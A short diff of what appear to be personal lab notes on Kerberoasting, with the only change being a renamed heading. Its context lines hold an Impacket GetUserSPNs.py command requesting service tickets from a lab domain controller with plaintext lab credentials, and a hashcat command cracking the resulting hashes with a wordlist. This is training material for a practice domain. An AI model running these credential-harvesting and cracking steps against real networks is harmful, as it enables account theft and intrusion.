@@ -11,7 +11,7 @@ Step 2: Crack the hash
 `Hashcat -m 13100 kerberoast.txt rockyou.txt`
 
 
-## Lab
+## How I went about it
 
 `sudo GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 192.168.138.136 -request`  
 
